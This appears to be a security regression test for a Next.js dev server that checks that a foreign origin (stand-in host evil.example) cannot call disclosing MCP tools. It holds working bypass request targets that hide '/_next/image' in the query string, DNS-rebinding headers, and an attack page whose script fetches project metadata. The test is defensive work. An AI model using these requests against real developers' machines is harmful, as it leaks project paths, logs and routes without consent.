/**
 * Spec for the Next.js dev-server MCP cross-site disclosure.
 *
 * These tests fail while `next dev` is the locked 16.2.9 server. They pass once
 * that server refuses a foreign Origin on `/_next/mcp`, including when the raw
 * request target carries `/_next/image` or `/_next/static/media` outside the
 * pathname. Run:
 *
 *   npx tsx --test tests/dev-mcp-cross-site.test.ts
 */
import assert from "node:assert/strict";
import { spawn, type ChildProcess } from "node:child_process";
import { once } from "node:events";
import { createServer, request as httpRequest, type IncomingMessage, type ServerResponse } from "node:http";
import { connect as netConnect, createServer as createTcpServer } from "node:net";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const projectRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

const ATTACKER_HOST = "evil.example";

const DISCLOSING_TOOLS: Array<[string, Record<string, unknown>]> = [
  ["get_project_metadata", {}],
  ["get_routes", {}],
  ["get_logs", {}],
  ["get_errors", {}],
  ["get_page_metadata", {}],
  ["get_server_action_by_id", { actionId: "not-a-real-action" }],
];

// The cross-site check treats a raw request target containing these substrings
// as a static asset and skips the origin check. The MCP handler then uses the
// parsed pathname, so the same request is served.
const REQUEST_TARGETS = [
  "/_next/mcp",
  "/_next/mcp?x=/_next/image",
  "/_next/mcp?x=/_next/static/media",
  "/_next/mcp/?x=/_next/image",
];

type HttpResult = {
  status: number;
  raw: string;
};

function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const server = createTcpServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      const port = typeof address === "object" && address ? address.port : 0;
      server.close(() => resolve(port));
    });
  });
}

function startDevServer(port: number): Promise<ChildProcess> {
  const child = spawn(
    process.execPath,
    [
      path.join(projectRoot, "node_modules/next/dist/bin/next"),
      "dev",
      "--turbopack",
      "-H",
      "127.0.0.1",
      "-p",
      String(port),
    ],
    {
      cwd: projectRoot,
      env: { ...process.env, NEXT_TELEMETRY_DISABLED: "1" },
      stdio: ["ignore", "pipe", "pipe"],
    },
  );

  let logs = "";
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`next dev did not become ready\n${logs}`));
    }, 30_000);
    const onData = (chunk: Buffer) => {
      logs += chunk.toString();
      if (logs.includes("Ready")) {
        clearTimeout(timer);
        resolve(child);
      }
    };
    child.stdout?.on("data", onData);
    child.stderr?.on("data", onData);
    child.once("exit", (code) => {
      clearTimeout(timer);
      reject(new Error(`next dev exited ${code} before ready\n${logs}`));
    });
  });
}

function stop(child: ChildProcess | undefined) {
  if (!child || child.killed) return;
  child.kill("SIGTERM");
}

function toolCall(id: number, name: string, args: Record<string, unknown>): string {
  return JSON.stringify({
    jsonrpc: "2.0",
    id,
    method: "tools/call",
    params: { name, arguments: args },
  });
}

function postRaw(
  port: number,
  requestTarget: string,
  headers: Record<string, string>,
  body = "",
): Promise<HttpResult> {
  const payload = Buffer.from(body);
  const head = [
    `POST ${requestTarget} HTTP/1.1`,
    ...Object.entries({
      Host: `127.0.0.1:${port}`,
      "Content-Type": "application/json",
      Accept: "application/json, text/event-stream",
      ...headers,
    }).map(([name, value]) => `${name}: ${value}`),
    `Content-Length: ${payload.length}`,
    "Connection: close",
    "",
    "",
  ].join("\r\n");

  return new Promise((resolve, reject) => {
    const socket = netConnect(port, "127.0.0.1");
    const chunks: Buffer[] = [];
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      socket.destroy();
      const raw = Buffer.concat(chunks).toString("utf8");
      const statusLine = raw.split("\r\n", 1)[0] ?? "";
      const status = Number(statusLine.split(" ")[1]);
      resolve({ status, raw });
    };
    const timer = setTimeout(finish, 4_000);
    socket.on("error", (error) => {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        reject(error);
      }
    });
    socket.on("data", (chunk) => {
      chunks.push(chunk);
      const raw = Buffer.concat(chunks).toString("utf8");
      if (
        raw.includes("\r\n\r\n") &&
        (raw.includes("Unauthorized") || raw.includes("event: message") || raw.includes("projectPath"))
      ) {
        finish();
      }
    });
    socket.on("end", finish);
    socket.write(head);
    socket.write(payload);
  });
}

function assertNotDisclosed(result: HttpResult, label: string) {
  assert.equal(
    result.status,
    403,
    `${label} was served to a foreign origin (HTTP ${result.status})`,
  );
  assert.equal(result.raw.includes(projectRoot), false, `${label} included the project directory`);
  assert.equal(result.raw.includes("logFilePath"), false, `${label} included the development log path`);
  assert.equal(result.raw.includes('"appRouter"'), false, `${label} included the route inventory`);
  assert.equal(
    /access-control-allow-origin:\s*\*/i.test(result.raw),
    false,
    `${label} advertised a wildcard CORS origin`,
  );
  assert.equal(
    new RegExp(`access-control-allow-origin:\\s*http://${ATTACKER_HOST}`, "i").test(result.raw),
    false,
    `${label} reflected the attacker origin`,
  );
}

let dev: ChildProcess | undefined;
let devPort = 0;

test.before(async () => {
  devPort = await freePort();
  dev = await startDevServer(devPort);
});

test.after(() => {
  stop(dev);
});

test("foreign origins cannot read the dev MCP endpoint", { timeout: 60_000 }, async () => {
  let id = 1;
  for (const requestTarget of REQUEST_TARGETS) {
    for (const [name, args] of DISCLOSING_TOOLS) {
      const result = await postRaw(
        devPort,
        requestTarget,
        { Origin: `http://${ATTACKER_HOST}` },
        toolCall(id++, name, args),
      );
      assertNotDisclosed(result, `${name} via ${requestTarget}`);
    }
  }

  // DNS-rebind shape: the browser's Host and Origin are the attacker's site,
  // while the TCP connection is the loopback dev server.
  const rebound = await postRaw(
    devPort,
    "/_next/mcp?x=/_next/image",
    {
      Host: `${ATTACKER_HOST}:${devPort}`,
      Origin: `http://${ATTACKER_HOST}:${devPort}`,
    },
    toolCall(id++, "get_project_metadata", {}),
  );
  assertNotDisclosed(rebound, "rebound get_project_metadata");

  const routes = await postRaw(
    devPort,
    "/_next/mcp?x=/_next/static/media",
    {
      Host: `${ATTACKER_HOST}:${devPort}`,
      Origin: `http://${ATTACKER_HOST}:${devPort}`,
    },
    toolCall(id++, "get_routes", {}),
  );
  assertNotDisclosed(routes, "rebound get_routes");

  const logs = await postRaw(
    devPort,
    "/_next/mcp/?x=/_next/image",
    {
      Host: `${ATTACKER_HOST}:${devPort}`,
      Origin: `http://${ATTACKER_HOST}:${devPort}`,
    },
    toolCall(id++, "get_logs", {}),
  );
  assertNotDisclosed(logs, "rebound get_logs");
});

test("a page on the attacker's origin cannot read project metadata", { timeout: 60_000 }, async () => {
  const forwarderPort = await freePort();
  const debugPort = await freePort();
  const page = `<!doctype html><meta charset="utf-8"><pre id="out">PENDING</pre><script>
const out = document.getElementById("out");
const ctrl = new AbortController();
setTimeout(() => ctrl.abort(), 2500);
(async () => {
  try {
    const res = await fetch("/_next/mcp?x=/_next/image", {
      method: "POST",
      signal: ctrl.signal,
      headers: {
        "content-type": "application/json",
        accept: "application/json, text/event-stream",
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 2,
        method: "tools/call",
        params: { name: "get_project_metadata", arguments: {} },
      }),
    });
    const reader = res.body.getReader();
    const dec = new TextDecoder();
    let text = "STATUS " + res.status + "\\n";
    while (true) {
      const { done, value } = await reader.read();
      if (value) text += dec.decode(value);
      if (done || text.includes("projectPath") || text.includes("Unauthorized")) break;
    }
    out.textContent = text.slice(0, 2000);
  } catch (error) {
    out.textContent = "FETCH_FAILED " + (error && error.name) + " " + (error && error.message);
  }
})();
</script>`;

  const forwarder = createServer((req: IncomingMessage, res: ServerResponse) => {
    if ((req.url ?? "").startsWith("/attack.html")) {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(page);
      return;
    }
    const forwarded = httpRequest(
      {
        hostname: "127.0.0.1",
        port: devPort,
        path: req.url,
        method: req.method,
        headers: req.headers,
      },
      (upstream) => {
        res.writeHead(upstream.statusCode ?? 502, upstream.headers);
        upstream.pipe(res);
      },
    );
    forwarded.on("error", () => {
      if (!res.headersSent) res.writeHead(502);
      res.end();
    });
    req.pipe(forwarded);
  });
  await new Promise<void>((resolve) => forwarder.listen(forwarderPort, "127.0.0.1", () => resolve()));

  const chrome = spawn(
    "google-chrome",
    [
      "--headless=new",
      "--no-sandbox",
      "--disable-gpu",
      `--remote-debugging-port=${debugPort}`,
      `--user-data-dir=/tmp/rdi-mcp-chrome-${debugPort}`,
      `--host-resolver-rules=MAP ${ATTACKER_HOST} 127.0.0.1`,
      "about:blank",
    ],
    { stdio: "ignore" },
  );

  try {
    const versionUrl = `http://127.0.0.1:${debugPort}/json/version`;
    let version: { webSocketDebuggerUrl: string } | undefined;
    for (let attempt = 0; attempt < 40 && !version; attempt += 1) {
      try {
        const response = await fetch(versionUrl);
        if (response.ok) version = (await response.json()) as { webSocketDebuggerUrl: string };
      } catch {
        await new Promise((resolve) => setTimeout(resolve, 150));
      }
    }
    assert.ok(version, "Chrome DevTools endpoint did not start");

    const browser = new WebSocket(version.webSocketDebuggerUrl);
    await once(browser, "open");
    let messageId = 0;
    const pending = new Map<number, (message: Record<string, unknown>) => void>();
    browser.addEventListener("message", (event) => {
      const message = JSON.parse(String(event.data)) as { id?: number };
      if (message.id && pending.has(message.id)) {
        pending.get(message.id)?.(message as Record<string, unknown>);
        pending.delete(message.id);
      }
    });
    const send = (method: string, params: Record<string, unknown>, sessionId?: string) => {
      const id = ++messageId;
      return new Promise<Record<string, unknown>>((resolve) => {
        pending.set(id, resolve);
        browser.send(JSON.stringify({ id, method, params, sessionId }));
      });
    };

    const created = await send("Target.createTarget", { url: "about:blank" });
    const targetId = (created.result as { targetId: string }).targetId;
    const attached = await send("Target.attachToTarget", { targetId, flatten: true });
    const sessionId = (attached.result as { sessionId: string }).sessionId;
    await send("Page.enable", {}, sessionId);
    await send("Runtime.enable", {}, sessionId);
    await send("Page.navigate", { url: `http://${ATTACKER_HOST}:${forwarderPort}/attack.html` }, sessionId);

    let text = "";
    for (let attempt = 0; attempt < 30 && (!text || text === "PENDING"); attempt += 1) {
      await new Promise((resolve) => setTimeout(resolve, 200));
      const evaluated = await send(
        "Runtime.evaluate",
        {
          expression: 'document.getElementById("out") ? document.getElementById("out").textContent : ""',
          returnByValue: true,
        },
        sessionId,
      );
      const result = evaluated.result as { result?: { value?: string } };
      text = result.result?.value ?? "";
    }
    await send("Target.closeTarget", { targetId });
    browser.close();

    assert.equal(text.includes(projectRoot), false, text);
    assert.equal(text.includes("projectPath"), false, text);
    assert.match(text, /Unauthorized|FETCH_FAILED|STATUS 403/);
  } finally {
    chrome.kill("SIGTERM");
    await new Promise<void>((resolve) => forwarder.close(() => resolve()));
  }
});
